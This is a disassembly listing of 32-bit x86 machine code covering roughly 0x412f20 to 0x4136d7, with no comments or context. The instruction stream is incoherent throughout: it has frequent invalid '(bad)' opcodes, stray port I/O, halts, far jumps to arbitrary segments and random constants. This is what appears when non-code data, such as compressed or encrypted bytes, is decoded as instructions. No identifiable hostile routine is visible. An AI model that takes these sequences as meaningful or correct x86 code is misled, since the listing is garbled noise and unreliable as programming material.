  412f20:	(bad)  [ebx+0x648b592b]
  412f26:	pop    esp
  412f27:	mov    edi,0x71dd85cc
  412f2c:	mov    esi,0x98ded3a8
  412f31:	test   BYTE PTR [ecx-0x2e],0xe
  412f35:	hlt    
  412f36:	sub    DWORD PTR [ebp+0x7c45e5e1],0x5ffb079e
  412f40:	sub    al,0x1
  412f42:	retf   
  412f43:	push   es
  412f44:	dec    edx
  412f45:	sbb    al,0x85
  412f47:	jle    0x412ef4
  412f49:	cmp    DWORD PTR [edi-0x25],esi
  412f4c:	dec    eax
  412f4d:	lods   eax,DWORD PTR ds:[esi]
  412f4e:	loop   0x412f3f
  412f50:	add    BYTE PTR [ebp+eiz*1-0x7820b912],0xe0
  412f58:	and    BYTE PTR [eax],bl
  412f5a:	cmp    al,0x10
  412f5c:	xchg   ebx,ebx
  412f5e:	add    al,cl
  412f60:	xlat   BYTE PTR ds:[ebx]
  412f61:	fadd   QWORD PTR [ecx+0xe]
  412f64:	xor    BYTE PTR [eax],bl
  412f66:	icebp  
  412f67:	loop   0x412f92
  412f69:	(bad)  
  412f6a:	fild   QWORD PTR [ebx+ecx*2-0x4c]
  412f6e:	mov    edi,edi
  412f70:	lods   al,BYTE PTR ds:[esi]
  412f71:	test   eax,0x21021f9d
  412f76:	lea    esp,[ecx-0x5800bc05]
  412f7c:	sbb    al,BYTE PTR [ebp-0x56]
  412f7f:	imul   edx,DWORD PTR [ecx-0x76],0xffffffa1
  412f83:	pop    ss
  412f84:	jno    0x412f13
  412f86:	dec    ebx
  412f87:	xchg   edx,eax
  412f88:	pushf  
  412f89:	sbb    eax,0x8c56c151
  412f8e:	xchg   ebx,eax
  412f8f:	mov    edx,0xaafa4109
  412f94:	inc    eax
  412f95:	jl     0x412f47
  412f97:	out    dx,al
  412f98:	pop    ds
  412f99:	cwde   
  412f9a:	rcr    DWORD PTR [ebp-0x69a22327],0x8a
  412fa1:	dec    edx
  412fa2:	ss mov esp,0xe5b61418
  412fa8:	jmp    0xa52a:0xafdcbc06
  412faf:	sbb    dl,BYTE PTR [edx]
  412fb1:	push   cs
  412fb2:	and    edx,DWORD PTR [ebx]
  412fb4:	cmc    
  412fb5:	or     DWORD PTR [edi],edx
  412fb7:	clc    
  412fb8:	push   edx
  412fb9:	cdq    
  412fba:	gs js  0x413035
  412fbd:	cmp    DWORD PTR [ecx],esi
  412fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fc0:	retf   
  412fc1:	sub    DWORD PTR [eax],eax
  412fc3:	outs   dx,BYTE PTR ds:[esi]
  412fc4:	in     eax,0xd0
  412fc6:	das    
  412fc7:	adc    eax,0xaea4efc6
  412fcc:	mov    bl,0x15
  412fce:	int    0x5c
  412fd0:	cld    
  412fd1:	sbb    BYTE PTR [ebx+0x33],bl
  412fd4:	push   es
  412fd5:	int3   
  412fd6:	cs dec esi
  412fd8:	pop    ss
  412fd9:	add    bh,BYTE PTR [eax-0x7fe5cbe9]
  412fdf:	loop   0x412f9d
  412fe1:	jge    0x412fcc
  412fe3:	inc    esi
  412fe4:	call   0xe892163f
  412fe9:	lods   eax,DWORD PTR ds:[esi]
  412fea:	pop    edi
  412feb:	sbb    eax,0xf2c7886e
  412ff0:	fdiv   QWORD PTR [eax+0x7b39b7eb]
  412ff6:	xlat   BYTE PTR ds:[ebx]
  412ff7:	xchg   ch,dh
  412ff9:	js     0x412ff4
  412ffb:	int    0x73
  412ffd:	inc    ebx
  412ffe:	xchg   ebp,eax
  412fff:	or     al,BYTE PTR [edx+0x75]
  413002:	je     0x41304d
  413004:	add    bh,BYTE PTR [eax+0x511b4e23]
  41300a:	add    DWORD PTR [ebx-0x14],edi
  41300d:	cmp    BYTE PTR [edi+ecx*8],dh
  413010:	(bad)
  413013:	jb     0x31ddf3d3
  413019:	sbb    cl,bh
  41301b:	push   cs
  41301c:	clc    
  41301d:	xor    DWORD PTR [edi-0x7c46b30c],ebx
  413023:	mov    dh,0x71
  413025:	sbb    eax,0x4999a158
  41302a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41302b:	cli    
  41302c:	(bad)  
  41302d:	mov    dl,BYTE PTR [esp+ecx*1]
  413030:	mov    DWORD PTR cs:[eax],0x18590e41
  413037:	mov    ebx,0xc6fb150
  41303c:	xor    BYTE PTR [edx],0x85
  41303f:	test   eax,0x32ec4427
  413044:	cmp    bl,BYTE PTR [edx]
  413046:	push   ds
  413047:	pop    ss
  413048:	jmp    0x3fc3:0xc5cdcb89
  41304f:	and    eax,0x2430c8af
  413054:	sbb    eax,0xb6baedf9
  413059:	ret    
  41305a:	jp     0x413090
  41305c:	stc    
  41305d:	(bad)  
  41305e:	repz fimul WORD PTR [ebx+ebp*1-0x1b1fc108]
  413066:	cdq    
  413067:	or     BYTE PTR [ebp+0x124a8542],dl
  41306d:	sub    DWORD PTR [ebx+esi*8],esi
  413070:	cmp    BYTE PTR [eax-0x4b],al
  413073:	std    
  413074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413075:	dec    ebp
  413076:	jle    0x413059
  413078:	outs   dx,BYTE PTR ds:[esi]
  413079:	out    dx,al
  41307a:	inc    eax
  41307b:	mov    bh,0x4a
  41307d:	in     al,0x99
  41307f:	mov    ds:0xa4e33a6d,eax
  413084:	and    DWORD PTR [ecx],esi
  413086:	jne    0x413042
  413088:	out    0x9d,eax
  41308a:	popa   
  41308b:	adc    DWORD PTR [esi-0x5d],ebp
  41308e:	adc    cl,ch
  413090:	or     edi,ebx
  413092:	jmp    0x10586f23
  413097:	in     eax,dx
  413098:	ficomp WORD PTR [edx-0xe962966]
  41309e:	aam    0x1
  4130a0:	ss (bad) 
  4130a3:	mov    edx,0x9376e3a0
  4130a8:	leave  
  4130a9:	xchg   ebp,eax
  4130aa:	jge    0x41305e
  4130ac:	mov    cl,0xa
  4130ae:	out    0xb3,eax
  4130b0:	lods   eax,DWORD PTR ds:[esi]
  4130b1:	xchg   ch,bh
  4130b3:	pop    edi
  4130b4:	mov    edx,0x3fad3b8a
  4130b9:	popa   
  4130ba:	out    dx,al
  4130bb:	push   0x8874a219
  4130c0:	sub    edx,DWORD PTR ds:0xc39511f
  4130c6:	aas    
  4130c7:	loop   0x4130ac
  4130c9:	pop    ebx
  4130ca:	and    DWORD PTR [ebx+edi*8-0x4c281cae],ebx
  4130d1:	xchg   esi,eax
  4130d2:	inc    ecx
  4130d3:	sbb    bl,BYTE PTR [ecx-0x7c6a174]
  4130d9:	push   edx
  4130da:	jne    0x413067
  4130dc:	enter  0x27d7,0x3a
  4130e0:	mov    ch,0x4
  4130e2:	jae    0x4130c5
  4130e4:	and    eax,0xa0acd41d
  4130e9:	inc    edx
  4130ea:	inc    eax
  4130eb:	pop    ds
  4130ec:	bound  edx,QWORD PTR [esi-0x6a4ad7f5]
  4130f2:	pop    esi
  4130f3:	repnz xchg ecx,eax
  4130f5:	outs   dx,DWORD PTR ds:[esi]
  4130f6:	cld    
  4130f7:	das    
  4130f8:	fmul   DWORD PTR [ebx-0x47]
  4130fb:	mov    eax,0xf4e31c76
  413100:	sar    BYTE PTR [edx],1
  413102:	cmovnp edi,DWORD PTR [esi]
  413105:	sbb    al,0xe
  413107:	retf   0xd407
  41310a:	pop    ebp
  41310b:	in     eax,0x93
  41310d:	xor    eax,0x8b2d139b
  413112:	fxch   st(7)
  413114:	or     al,BYTE PTR [esi+0x3f]
  413117:	outs   dx,BYTE PTR ds:[esi]
  413118:	sti    
  413119:	push   esi
  41311a:	(bad)  
  41311b:	pop    edi
  41311c:	add    BYTE PTR [edx+0x3cf85c26],0xbe
  413123:	mov    WORD PTR [esi],?
  413125:	mov    esi,0xec8734c
  41312a:	std    
  41312b:	or     ecx,edx
  41312d:	(bad)  
  41312e:	sbb    ebx,DWORD PTR [esi+0x24]
  413131:	outs   dx,BYTE PTR ds:[esi]
  413132:	and    ebx,esp
  413134:	stos   BYTE PTR es:[edi],al
  413135:	adc    esi,DWORD PTR [edx-0x5562aef8]
  41313b:	push   edx
  41313c:	leave  
  41313d:	mov    edi,0x98214d24
  413142:	jecxz  0x413145
  413144:	ja     0x4130d7
  413146:	and    eax,0xd9347a46
  41314b:	mov    esp,0x9f0905d
  413150:	pop    esi
  413151:	lods   eax,DWORD PTR ds:[esi]
  413152:	dec    eax
  413153:	dec    esi
  413154:	jbe    0x41316b
  413156:	out    0xfd,al
  413158:	fs das 
  41315a:	nop
  41315b:	push   es
  41315c:	push   eax
  41315d:	mov    al,ds:0x94c0d5c1
  413162:	push   es
  413163:	in     eax,dx
  413164:	fldenv [eax]
  413166:	lds    edx,FWORD PTR ss:[eax]
  413169:	cld    
  41316a:	shl    DWORD PTR [esi+0x1af3b5b9],1
  413170:	ja     0x4131b6
  413172:	fimul  DWORD PTR [edx]
  413174:	push   ebx
  413175:	out    dx,al
  413176:	imul   ebp,eax,0x9f7ad6de
  41317c:	fsubr  st,st(6)
  41317e:	div    DWORD PTR [esi]
  413180:	int3   
  413181:	inc    eax
  413182:	push   ecx
  413183:	and    DWORD PTR [ecx+0x6b7f41b1],edi
  413189:	ins    DWORD PTR es:[edi],dx
  41318a:	add    DWORD PTR [ebx-0x353008e1],0xfffffff3
  413191:	arpl   WORD PTR [eax-0x33],si
  413194:	push   eax
  413195:	jp     0x4131e6
  413197:	add    BYTE PTR [edx+0x4cfabc3a],0x1f
  41319e:	ja     0x41318d
  4131a0:	xor    DWORD PTR es:[ecx-0x1528f509],ebp
  4131a7:	aad    0xc3
  4131a9:	push   esp
  4131aa:	loopne 0x4131c4
  4131ac:	mov    dl,0xbf
  4131ae:	aam    0xe9
  4131b0:	xchg   DWORD PTR [eiz*2-0x63a1c1e1],edx
  4131b7:	into   
  4131b8:	jp     0x413154
  4131ba:	inc    ebp
  4131bb:	out    0xac,al
  4131bd:	dec    eax
  4131be:	mov    ebx,0x5d7c5ae8
  4131c3:	pop    ecx
  4131c4:	aam    0x63
  4131c6:	ds jno 0x4131be
  4131c9:	addr16 xchg edx,eax
  4131cb:	xor    eax,0xfb5e2e51
  4131d0:	mov    ch,0x64
  4131d2:	inc    edi
  4131d3:	push   esi
  4131d4:	mov    edx,0x841dca3
  4131d9:	imul   ebp,DWORD PTR [eax],0x2
  4131dc:	cli    
  4131dd:	fild   WORD PTR [ebx-0x1eae696f]
  4131e3:	jb     0x4131b2
  4131e5:	mov    ebp,DWORD PTR [esi+0x97b8a47]
  4131eb:	push   edi
  4131ec:	and    edi,DWORD PTR [edx-0x6801867]
  4131f2:	lods   eax,DWORD PTR ds:[esi]
  4131f3:	dec    ebp
  4131f4:	popf   
  4131f5:	lahf   
  4131f6:	fs enter 0x3c8b,0x60
  4131fb:	popf   
  4131fc:	repz cdq 
  4131fe:	jae    0x4131b8
  413200:	pushf  
  413201:	and    al,0xd0
  413203:	push   cs
  413204:	cld    
  413205:	(bad)  
  413206:	xor    dh,BYTE PTR [ebp-0x74981288]
  41320c:	test   DWORD PTR [ebx+0x74e5b023],eax
  413212:	ins    DWORD PTR es:[edi],dx
  413213:	sti    
  413214:	mov    ecx,0x1b7d4897
  413219:	mov    dl,0xb1
  41321b:	pop    ds
  41321c:	pushf  
  41321d:	xor    BYTE PTR [ebx-0x9],ah
  413220:	in     al,dx
  413221:	mov    ah,0x97
  413223:	inc    edx
  413224:	fs pop ebx
  413226:	hlt    
  413227:	jo     0x41327b
  413229:	ficom  DWORD PTR [esi]
  41322b:	jp     0x413214
  41322d:	hlt    
  41322e:	and    esp,DWORD PTR [eax]
  413230:	jne    0x413236
  413232:	xor    BYTE PTR [ecx+0x5b272c02],bl
  413238:	aas    
  413239:	jb     0x413244
  41323b:	shl    BYTE PTR [edx],cl
  41323d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41323e:	aad    0x8
  413240:	das    
  413241:	mov    DWORD PTR [esi],edi
  413243:	mov    ecx,DWORD PTR [eax-0x6924da83]
  413249:	jae    0x4132be
  41324b:	mov    al,0x7
  41324d:	neg    BYTE PTR [ebx]
  41324f:	addr16 dec esi
  413251:	nop
  413252:	mov    ch,0x6d
  413254:	push   es
  413255:	push   0x9ae49e6c
  41325a:	xor    esp,ebp
  41325c:	sbb    DWORD PTR ds:0x809c2abf,edx
  413262:	xchg   ebx,eax
  413263:	jp     0x41322f
  413265:	jmp    0xdd5cf302
  41326a:	(bad)  
  41326b:	std    
  41326c:	xchg   ebp,eax
  41326d:	lea    edi,[edi+0x2b]
  413270:	ror    BYTE PTR [esi],cl
  413272:	push   ebx
  413273:	cmp    bh,BYTE PTR [ebx+eax*2]
  413276:	js     0x41324f
  413278:	xlat   BYTE PTR ds:[ebx]
  413279:	sti    
  41327a:	jg     0x4132cd
  41327c:	push   esi
  41327d:	xlat   BYTE PTR ds:[ebx]
  41327e:	jp     0x4132e9
  413280:	dec    edx
  413281:	push   0xffffff8d
  413283:	ss retf 
  413285:	push   esi
  413286:	test   DWORD PTR [ebx+edx*1-0x2a515f2e],edx
  41328d:	mov    eax,ds:0x554edce3
  413292:	cmp    BYTE PTR [edx+0x4a],ah
  413295:	repnz mov DWORD PTR [edi-0x1206cf77],esp
  41329c:	das    
  41329d:	pop    edi
  41329e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41329f:	jnp    0x413261
  4132a1:	xor    dh,BYTE PTR [ecx-0x411ba77a]
  4132a7:	and    eax,0x3ab71d4
  4132ac:	sub    DWORD PTR [edi],edi
  4132ae:	mov    edi,0xb047694b
  4132b3:	sbb    eax,0xd14c3480
  4132b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b9:	cwde   
  4132ba:	rcl    DWORD PTR [ebx],cl
  4132bc:	jno    0x413312
  4132be:	lea    esi,[esp+ebp*1]
  4132c1:	fld    QWORD PTR [eax-0x6a]
  4132c4:	rol    BYTE PTR [edi+0x26],0xf0
  4132c8:	xchg   ecx,eax
  4132c9:	ja     0x413339
  4132cb:	and    ebp,edi
  4132cd:	add    bl,dl
  4132cf:	cmp    DWORD PTR [ebx],edi
  4132d1:	outs   dx,DWORD PTR ds:[esi]
  4132d2:	or     ch,bl
  4132d4:	ins    BYTE PTR es:[edi],dx
  4132d5:	sbb    ebp,DWORD PTR [esi]
  4132d7:	and    ah,BYTE PTR [eiz*8+0x7ecbf68a]
  4132de:	sub    DWORD PTR cs:0x588baeb4,ebx
  4132e5:	cmovns ebp,DWORD PTR [ecx]
  4132e8:	mov    esi,0x29ebe102
  4132ed:	leave  
  4132ee:	pop    esi
  4132ef:	dec    ebp
  4132f0:	xor    bh,bh
  4132f2:	fs pop ebp
  4132f4:	pusha  
  4132f5:	cmp    DWORD PTR [esi+0x2ce2fe68],0x71
  4132fc:	xor    DWORD PTR [edx+0x18],eax
  4132ff:	loope  0x4132fb
  413301:	lds    ebp,FWORD PTR [edx-0x61]
  413304:	and    eax,0x5fc5fc76
  413309:	hlt    
  41330a:	fild   DWORD PTR [edx-0x56]
  41330d:	jle    0x41334b
  41330f:	inc    edi
  413310:	jge    0x4132fd
  413312:	mov    esi,0xb2ea3195
  413317:	or     dl,BYTE PTR [esi]
  413319:	jg     0x413317
  41331b:	mov    dl,0x90
  41331d:	or     DWORD PTR ds:0x48903cc2,esi
  413323:	push   cs
  413324:	pop    es
  413325:	sub    ebp,ebp
  413327:	cs ret 0x34f
  41332b:	jno    0x4132e6
  41332d:	call   0xf811:0x9b6dae7d
  413334:	lock sbb dl,BYTE PTR [edx+0x2e]
  413338:	dec    edx
  413339:	lock and ah,ah
  41333c:	jns    0x4133b6
  41333e:	dec    edi
  41333f:	xchg   ebx,eax
  413340:	add    cl,BYTE PTR [edx]
  413342:	scas   al,BYTE PTR es:[edi]
  413343:	or     BYTE PTR [ebp+0x1f835002],ah
  413349:	mov    ch,0xe2
  41334b:	fwait
  41334c:	add    eax,0x882cb3fd
  413351:	enter  0x66a8,0xde
  413355:	pop    edx
  413356:	jne    0x413399
  413358:	mov    eax,0xc3c12d9
  41335d:	loopne 0x413321
  41335f:	imul   edi,DWORD PTR [ecx-0x6213fe02],0x36
  413366:	ret    
  413367:	je     0x413348
  413369:	ds ins DWORD PTR es:[edi],dx
  41336b:	repz dec ecx
  41336d:	sbb    BYTE PTR [eax-0x5f],cl
  413370:	(bad)  
  413371:	out    0x5d,eax
  413373:	sbb    BYTE PTR [ecx],cl
  413375:	retf   0x6269
  413378:	mov    edx,0x9a9af538
  41337d:	cmc    
  41337e:	dec    ebp
  41337f:	mov    ch,0x61
  413381:	push   eax
  413382:	jg     0x41333b
  413384:	sti    
  413385:	push   es
  413386:	push   es
  413387:	aas    
  413388:	shl    esi,1
  41338a:	xchg   edx,eax
  41338b:	xchg   edx,eax
  41338c:	xchg   esi,eax
  41338d:	mov    eax,ds:0x8c94b73e
  413392:	jae    0x41337d
  413394:	mov    eax,ds:0x44fbc85
  413399:	pop    ss
  41339a:	pusha  
  41339b:	or     DWORD PTR [eax+eiz*4-0x270b6354],ebx
  4133a2:	std    
  4133a3:	adc    eax,0xf8a7fb87
  4133a8:	inc    eax
  4133a9:	in     eax,0xe4
  4133ab:	gs cmp al,0xf3
  4133ae:	sub    eax,0x52f69512
  4133b3:	xchg   ebp,eax
  4133b4:	or     ah,BYTE PTR [edi]
  4133b6:	sbb    al,0x67
  4133b8:	xor    al,BYTE PTR [esi]
  4133ba:	cdq    
  4133bb:	mov    cs,WORD PTR [edx-0x53c6a2c7]
  4133c1:	push   ds
  4133c2:	sub    al,0xc
  4133c4:	jp     0x4133f8
  4133c6:	pop    esp
  4133c7:	fincstp 
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	inc    ecx
  4133cb:	pusha  
  4133cc:	loope  0x4133ba
  4133ce:	xor    eax,0x580c4693
  4133d3:	mov    esp,0xdb449e13
  4133d8:	mov    bh,0xcd
  4133da:	push   edi
  4133db:	jns    0x41340f
  4133dd:	scas   eax,DWORD PTR es:[edi]
  4133de:	jnp    0x413421
  4133e0:	mov    al,ds:0x4bd5f31d
  4133e5:	push   edx
  4133e6:	cmp    eax,0xced7a061
  4133eb:	(bad)  
  4133ec:	sar    BYTE PTR [edx-0x728a2268],1
  4133f2:	xchg   ebx,eax
  4133f3:	mov    edx,0x2e3ce110
  4133f8:	popa   
  4133f9:	mov    al,ds:0x1dd0dca
  4133fe:	nop
  4133ff:	sbb    esi,0xd1ef3901
  413405:	xor    ebp,ebp
  413407:	arpl   WORD PTR [edx+0x20bf9027],cx
  41340d:	push   es
  41340e:	xchg   ebp,eax
  41340f:	scas   al,BYTE PTR es:[edi]
  413410:	adc    eax,0x2b2ffffe
  413415:	xchg   ebx,eax
  413416:	sub    eax,0x1fad380a
  41341b:	(bad)  
  41341c:	test   al,0xcc
  41341e:	loop   0x4133d6
  413420:	mov    bl,0x26
  413422:	popa   
  413423:	and    BYTE PTR ds:0xfaeecd1c,0x73
  41342a:	sub    ebp,edx
  41342c:	inc    edi
  41342d:	das    
  41342e:	outs   dx,BYTE PTR ds:[esi]
  41342f:	daa    
  413430:	test   bh,dh
  413432:	adc    bl,dh
  413434:	sbb    DWORD PTR [edi+0x56],esp
  413437:	inc    eax
  413438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413439:	pop    ds
  41343a:	lock iret 
  41343c:	xor    al,0x9b
  41343e:	xchg   esi,eax
  41343f:	jo     0x413415
  413441:	ins    DWORD PTR es:[di],dx
  413443:	retf   0xf52e
  413446:	pop    ebx
  413447:	leave  
  413448:	mov    ch,0xdf
  41344a:	enter  0x23a4,0xeb
  41344e:	les    eax,FWORD PTR [edi+0x4615d45e]
  413454:	popf   
  413455:	push   edx
  413456:	lds    ecx,FWORD PTR [ecx]
  413458:	adc    DWORD PTR [ecx+ecx*4],0x4c
  41345c:	xchg   esi,eax
  41345d:	leave  
  41345e:	cmp    dl,ch
  413460:	xchg   ebx,eax
  413461:	pop    ecx
  413462:	sbb    DWORD PTR [eax+0x35c775fa],eax
  413468:	xchg   ebx,eax
  413469:	xchg   esi,eax
  41346a:	pop    es
  41346b:	bound  ebx,QWORD PTR [esi-0x7a]
  41346e:	jns    0x41347a
  413470:	and    BYTE PTR ds:0xdfdf953b,dl
  413476:	dec    esi
  413477:	scas   eax,DWORD PTR es:[edi]
  413478:	mov    ah,0x7a
  41347a:	jp     0x413454
  41347c:	pop    ss
  41347d:	dec    BYTE PTR [edx-0x35709965]
  413483:	ins    BYTE PTR es:[edi],dx
  413484:	cmp    BYTE PTR [esi+0x1d],ch
  413487:	sbb    eax,0x504082a2
  41348c:	sar    BYTE PTR [edi-0x5c],cl
  41348f:	sahf   
  413490:	dec    esi
  413491:	(bad)  
  413492:	push   0x3685b233
  413497:	sub    BYTE PTR [eax+0x7452cdbc],0xce
  41349e:	adc    eax,0xaf7619b7
  4134a3:	add    al,0x2f
  4134a5:	push   ecx
  4134a6:	dec    bp
  4134a8:	xor    al,bl
  4134aa:	jl     0x41347c
  4134ac:	mov    esi,0x3a626094
  4134b1:	sub    al,0x48
  4134b3:	out    dx,al
  4134b4:	jmp    0x6443c740
  4134b9:	js     0x4134a2
  4134bb:	loope  0x41350d
  4134bd:	or     esp,DWORD PTR [edx]
  4134bf:	ja     0x41345d
  4134c1:	ror    DWORD PTR [esi+eiz*4],0x80
  4134c5:	lds    esi,FWORD PTR [ecx]
  4134c7:	xchg   BYTE PTR [ebx*2+0x16498fcb],dl
  4134ce:	sbb    DWORD PTR [edi],ecx
  4134d0:	inc    ebp
  4134d1:	out    dx,al
  4134d2:	pushf  
  4134d3:	add    eax,0xc1ba07cd
  4134d8:	or     BYTE PTR [edi],bh
  4134da:	xor    BYTE PTR [ecx+0x4d],dl
  4134dd:	pop    ds
  4134de:	xchg   esi,eax
  4134df:	call   FWORD PTR [edi+eax*4+0x26]
  4134e3:	inc    esi
  4134e4:	out    dx,eax
  4134e5:	in     al,dx
  4134e6:	pusha  
  4134e7:	dec    BYTE PTR [ecx+0x72deea13]
  4134ed:	dec    edi
  4134ee:	cmp    DWORD PTR [ebp-0x23],ecx
  4134f1:	push   ebx
  4134f2:	nop
  4134f3:	push   edx
  4134f5:	pop    esi
  4134f6:	fwait
  4134f7:	or     DWORD PTR [ebx-0x450aff17],esi
  4134fd:	jno    0x41354f
  4134ff:	push   cs
  413500:	in     al,dx
  413501:	int    0xce
  413503:	lods   al,BYTE PTR ds:[esi]
  413504:	adc    al,0x2e
  413506:	and    ebp,DWORD PTR [ebx+ebx*1]
  413509:	call   0x377:0x30ac34d6
  413510:	xor    edi,DWORD PTR [eax]
  413512:	pop    ebx
  413513:	adc    al,0xa
  413515:	inc    ebp
  413516:	sbb    ch,ch
  413518:	lahf   
  413519:	or     al,0x38
  41351b:	sub    al,BYTE PTR [eax+0x54]
  41351e:	sbb    DWORD PTR [eax],eax
  413520:	mov    esi,0x16c7bc68
  413525:	mov    al,ds:0x948bdeca
  41352a:	or     dl,dl
  41352c:	mov    ebx,0x6de18d3b
  413531:	out    0xb0,al
  413533:	push   eax
  413534:	int3   
  413535:	and    esi,DWORD PTR [ebx+0x3d]
  413538:	mov    ds:0x67227995,eax
  41353d:	jo     0x4134dd
  41353f:	mov    esp,0x6ff8b161
  413544:	icebp  
  413545:	xchg   esi,eax
  413546:	enter  0x663b,0x9
  41354a:	hlt    
  41354b:	push   edi
  41354c:	inc    BYTE PTR ds:0xa7a32a77
  413552:	sbb    BYTE PTR [eax],bh
  413554:	(bad)  
  413555:	mov    cl,0x6f
  413557:	test   DWORD PTR [edx],eax
  413559:	jg     0x41356d
  41355b:	dec    edi
  41355c:	fisttp DWORD PTR [ebp+0x533212d3]
  413562:	xor    edx,DWORD PTR [di]
  413565:	sub    BYTE PTR [ebp+0x51839572],bl
  41356b:	int    0xd0
  41356d:	mov    ds:0xb8d0a744,eax
  413572:	dec    ebx
  413573:	shl    BYTE PTR [ebp-0x76],cl
  413576:	mov    ebx,eax
  413578:	ja     0x4135f7
  41357a:	jmp    0xfc5a:0x412e9efc
  413581:	push   esp
  413582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413584:	shr    DWORD PTR [ebp-0x1e],cl
  413587:	cvttps2pi mm3,QWORD PTR [esi+0x182addf]
  41358e:	ret    0xc192
  413591:	push   ebp
  413592:	sbb    DWORD PTR [edi],ecx
  413594:	jl     0x413574
  413596:	(bad)  
  413598:	rol    BYTE PTR [ebp+ecx*8-0x71],0xb4
  41359d:	xor    dh,BYTE PTR [ebx+eiz*8-0x3718f8aa]
  4135a4:	jecxz  0x4135ee
  4135a6:	shl    DWORD PTR [ebx+0x7d],cl
  4135a9:	xchg   ebx,eax
  4135aa:	xchg   ebp,eax
  4135ab:	xor    eax,0xda2f8cfd
  4135b0:	fstp   QWORD PTR [ebx-0x31942c03]
  4135b6:	(bad)  
  4135b7:	(bad)  
  4135b8:	push   ebp
  4135b9:	cmp    BYTE PTR [ebp-0x1c7e8c28],bl
  4135bf:	mov    eax,ds:0xd0fcc5e3
  4135c4:	imul   DWORD PTR [edx+0x152c0cfb]
  4135ca:	fcmovb st,st(5)
  4135cc:	bound  edi,QWORD PTR [ebx]
  4135ce:	xor    ch,BYTE PTR [eax]
  4135d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135d1:	mov    ah,0xcd
  4135d3:	pop    esp
  4135d4:	push   esp
  4135d5:	in     eax,dx
  4135d6:	aad    0x99
  4135d8:	sub    bh,dh
  4135da:	jmp    0x413620
  4135dc:	and    al,0x8f
  4135de:	mov    DWORD PTR [edi+0x6b],esi
  4135e1:	dec    ebx
  4135e2:	pop    edi
  4135e3:	aam    0x1e
  4135e5:	ja     0x413571
  4135e7:	in     eax,dx
  4135e8:	add    dh,BYTE PTR [ebx-0x5e]
  4135eb:	xchg   esp,eax
  4135ec:	inc    ebp
  4135ed:	fnstenv [edx]
  4135ef:	pop    ds
  4135f0:	inc    eax
  4135f1:	xor    BYTE PTR [ebp+0x24],al
  4135f4:	ret    0xf263
  4135f7:	pop    ebx
  4135f8:	imul   ecx,DWORD PTR [eax+ecx*1+0x5d],0x35
  4135fd:	sub    BYTE PTR [ebx],al
  4135ff:	fbstp  TBYTE PTR [edi]
  413601:	daa    
  413602:	mov    dl,0xdc
  413604:	test   DWORD PTR [eax],ecx
  413606:	jbe    0x4135ab
  413608:	bound  ebp,QWORD PTR [edi-0x4b]
  41360b:	mov    ds:0x66eb98fa,al
  413610:	cdq    
  413611:	add    al,0x18
  413613:	outs   dx,DWORD PTR ds:[esi]
  413614:	out    0x31,eax
  413616:	mov    ecx,0xab49c924
  41361b:	inc    eax
  41361c:	push   0xba8842d
  413621:	cdq    
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jmp    0x244096ad
  413628:	fwait
  413629:	popa   
  41362a:	jnp    0x413682
  41362c:	adc    DWORD PTR [ebx+0x3cc0eebb],esi
  413632:	(bad)  
  413633:	stc    
  413634:	push   esp
  413635:	jbe    0x413682
  413637:	or     bl,dh
  413639:	add    DWORD PTR [edi+0x36],eax
  41363c:	lods   al,BYTE PTR ds:[esi]
  41363d:	sub    BYTE PTR [edi],dh
  41363f:	push   ebp
  413640:	and    DWORD PTR [eax-0x4893773f],esp
  413646:	mov    esp,0x71742714
  41364b:	inc    edx
  41364c:	mov    ch,0x2a
  41364e:	lock jo 0x413695
  413651:	mov    esp,0x710eb92f
  413656:	lods   al,BYTE PTR ds:[esi]
  413657:	cwde   
  413658:	stc    
  413659:	adc    esp,DWORD PTR [edx]
  41365b:	outs   dx,BYTE PTR ds:[esi]
  41365c:	add    DWORD PTR [edi],ebx
  41365e:	das    
  41365f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413660:	and    al,0xa
  413662:	xchg   ebx,eax
  413663:	enter  0xd7d4,0x3f
  413667:	(bad)  
  413669:	cmc    
  41366a:	cmp    ebx,DWORD PTR [edx+0x20]
  41366d:	and    eax,edi
  41366f:	or     esp,DWORD PTR [ebp+0x59932709]
  413675:	mov    dl,0x25
  413677:	jne    0x4136b6
  413679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41367a:	dec    eax
  41367b:	in     al,dx
  41367c:	add    DWORD PTR [edi],edx
  41367e:	pop    edi
  41367f:	hlt    
  413680:	pop    ebp
  413681:	jb     0x413630
  413683:	push   0x6e
  413685:	dec    edi
  413686:	ins    BYTE PTR es:[edi],dx
  413687:	cmp    bl,ch
  413689:	jno    0x413651
  41368b:	stos   DWORD PTR es:[edi],eax
  41368c:	stos   BYTE PTR es:[edi],al
  41368d:	adc    al,0x31
  41368f:	(bad)  
  413690:	sub    DWORD PTR [edx-0x7c],ebp
  413693:	mov    ah,0xbe
  413695:	jge    0x41364d
  413697:	pusha  
  413698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413699:	xchg   DWORD PTR [ebp-0x33],esp
  41369c:	inc    esi
  41369d:	mov    bl,0xd8
  41369f:	pop    edi
  4136a0:	outs   dx,BYTE PTR ds:[esi]
  4136a1:	push   0xffffffca
  4136a3:	or     eax,ebx
  4136a5:	xor    eax,0x1d579dbb
  4136aa:	je     0x4136b4
  4136ac:	sub    DWORD PTR ds:0x2327da49,0x2b
  4136b3:	popf   
  4136b4:	xchg   DWORD PTR [esi+edi*1-0x26],edi
  4136b8:	xor    ebp,DWORD PTR [eax+0x46]
  4136bb:	dec    BYTE PTR [ecx-0x3cd16e62]
  4136c1:	jnp    0x41367b
  4136c3:	mov    eax,ds:0xd1ffe712
  4136c8:	adc    ch,dl
  4136ca:	imul   edx,DWORD PTR [esi],0x715a607
  4136d0:	sti    
  4136d1:	ss xor al,0x7
  4136d4:	mov    ss,WORD PTR [ebp-0x65]
  4136d7:	pop    ss
